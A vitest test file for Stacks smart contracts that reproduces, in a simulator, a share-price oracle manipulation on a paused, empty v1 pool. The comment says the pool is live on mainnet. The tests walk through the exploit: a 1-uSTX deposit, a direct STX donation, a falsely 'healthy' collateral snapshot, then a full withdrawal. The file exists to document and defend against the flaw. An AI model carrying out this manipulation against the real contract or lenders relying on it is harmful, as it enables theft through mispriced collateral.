import { describe, expect, it, beforeEach } from "vitest";
import { Cl, cvToValue } from "@stacks/transactions";

/**
 * Flashstack-ajv.4.4: why the deprecated v1 oracle must not be consumed.
 *
 * flashstack-pool-oracle (live, SP20XD46...) reads the paused, empty v1
 * flashstack-stx-pool. Mainnet today: paused=true, balance 0, shares 0, so the
 * oracle answers its empty-pool constant, SHARE-PRECISION (1e6).
 *
 * Pinned here, on the localized copies (byte-identical logic):
 *   1. The empty-pool constant is on a different scale from the pool's own
 *      share math. A first deposit mints amount * 1e6 shares, so the computed
 *      price is 1, not 1e6. One 1-uSTX deposit moves the oracle 1,000,000x.
 *   2. With pause on (as on mainnet), anyone can deposit 1 uSTX, send STX to
 *      the pool directly, read any price they like, and withdraw everything
 *      back as the sole LP. The manipulation costs only gas.
 * See docs/security/V1_POOLS_DISPOSITION.md.
 */

const POOL = "flashstack-stx-pool";
const ORACLE = "flashstack-pool-oracle";
const PRECISION = 1_000_000;

describe("v1 oracle on a paused, empty v1 pool (ajv.4.4)", () => {
  let deployer: string;
  let attacker: string;

  const price = () => simnet.callReadOnlyFn(ORACLE, "get-share-price", [], deployer).result;

  beforeEach(() => {
    deployer = simnet.getAccounts().get("deployer")!;
    attacker = simnet.getAccounts().get("wallet_2")!;
    expect(simnet.callPublicFn(POOL, "set-paused", [Cl.bool(true)], deployer).result).toBeOk(Cl.bool(true));
  });

  it("empty pool reads 1e6; a 1-uSTX deposit drops it to 1", () => {
    expect(price()).toBeOk(Cl.uint(PRECISION));
    expect(simnet.callPublicFn(POOL, "deposit", [Cl.uint(1)], attacker).result).toBeOk(Cl.uint(PRECISION));
    expect(price()).toBeOk(Cl.uint(1));
  });

  it("a paused pool lets a sole LP set the price and take the donation back", () => {
    const donation = 5_000_000_000; // 5,000 STX, returned in full below
    const before = simnet.getAssetsMap().get("STX")!.get(attacker)!;

    simnet.callPublicFn(POOL, "deposit", [Cl.uint(1)], attacker);
    simnet.transferSTX(donation, `${deployer}.${POOL}`, attacker);
    expect(price()).toBeOk(Cl.uint(donation + 1));

    // the snapshot a lender would read: healthy, priced at the donation
    const snap = cvToValue(simnet.callReadOnlyFn(ORACLE, "get-collateral-snapshot", [], deployer).result).value;
    expect(snap["share-price"].value).toBe(String(donation + 1));
    expect(snap["pool-balance"].value).toBe(String(donation + 1));
    expect(snap["total-shares"].value).toBe(String(PRECISION));
    expect(snap["is-healthy"].value).toBe(true);

    expect(simnet.callPublicFn(POOL, "withdraw", [Cl.uint(PRECISION)], attacker).result).toBeOk(Cl.uint(donation + 1));
    expect(simnet.getAssetsMap().get("STX")!.get(attacker)!).toBe(before);
    expect(price()).toBeOk(Cl.uint(PRECISION));
  });
});
